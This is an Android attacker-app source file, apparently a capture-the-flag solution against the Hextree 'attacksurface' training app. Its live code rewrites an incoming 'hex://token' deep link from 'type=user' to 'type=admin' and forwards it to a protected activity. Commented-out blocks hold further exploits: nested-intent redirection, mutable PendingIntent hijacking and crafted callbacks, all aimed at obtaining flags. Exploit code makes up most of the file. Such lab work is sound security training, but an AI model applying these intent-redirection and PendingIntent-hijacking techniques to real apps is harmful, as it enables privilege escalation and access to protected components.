package io.hextree.attackerapp;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Intent browserIntent = getIntent();

        if (browserIntent != null && "android.intent.action.VIEW".equals(browserIntent.getAction())) {
            Uri data = browserIntent.getData();

            if (data != null && "hex".equals(data.getScheme()) && "token".equals(data.getHost())) {

                Intent newIntent = new Intent();
                newIntent.fillIn(browserIntent,
                        Intent.FILL_IN_DATA | Intent.FILL_IN_ACTION | Intent.FILL_IN_CATEGORIES);

                String newDataString = newIntent.getDataString().replace("type=user", "type=admin");
                newIntent.setData(Uri.parse(newDataString));

                newIntent.setComponent(new ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag14Activity"
                ));

                startActivity(newIntent);
                finish();
            }
        }
//        Intent recievdIntent  = getIntent();
//        if (recievdIntent == null) {
//            Toast.makeText(MainActivity.this, "No intent", Toast.LENGTH_LONG).show();
//            return;
//        }
//        if (recievdIntent.getAction().equals("io.hextree.attacksurface.MUTATE_ME")) {
//            Toast.makeText(MainActivity.this, "Got intent", Toast.LENGTH_LONG).show();
//        }
//
//        PendingIntent pendingIntentt = recievdIntent.getParcelableExtra("pending_intent");
//        if (pendingIntentt == null) {
//            Toast.makeText(MainActivity.this, "No pending intent", Toast.LENGTH_LONG).show();
//            return;
//        }
//        Toast.makeText(MainActivity.this, "Got pending intent", Toast.LENGTH_LONG).show();
//
//        Intent mutedIntent = new Intent();
//        mutedIntent.setClassName(
//                "io.hextree.attacksurface",
//                "io.hextree.attacksurface.activities.Flag23Activity"
//        );
//        mutedIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
//        mutedIntent.putExtra("code", 42);
//        try {
//            pendingIntentt.send(this, 0, mutedIntent);
//        } catch (PendingIntent.CanceledException e) {
//            e.printStackTrace();
//        }
//        finish();
        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

//                Intent intent3 = new Intent();
//                intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
//                intent3.putExtra("reason", "next");
//intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//                Intent intent2 = new Intent();
//                intent2.putExtra("return", 42);
//                intent2.putExtra("nextIntent", intent3);
//
//                Intent intent = new Intent();
//
//                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
//                intent.putExtra("android.intent.extra.INTENT", intent2);
//                startActivity(intent);
            //    Intent recieverIntent = new Intent(MainActivity.this, Reciverintent.class);

//                Intent targetIntent = new Intent();
//                targetIntent.putExtra(getPackageName(), MainActivity.class.getCanonicalName() );
//                PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this, 0, recieverIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
//                Intent intent = new Intent();
//            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
//
//                intent.putExtra("PENDING", pendingIntent);
//                startActivity(intent);
//                finish();



            }
        });

        findViewById(R.id.buttobb).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean success = getIntent().getBooleanExtra("success", false);
                String flag = getIntent().getStringExtra("flag");

                if (success && flag != null) {
                    Toast.makeText(MainActivity.this, "FLAG: " + flag, Toast.LENGTH_LONG).show();
                    Log.i("FLAG22", "FLAG: " + flag);
                } else {
                    Toast.makeText(MainActivity.this, "Invalid callback received", Toast.LENGTH_LONG).show();
                }

                finish();
            }

        });
//        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
//            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
//            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
//            return insets;
//        });
    }
}
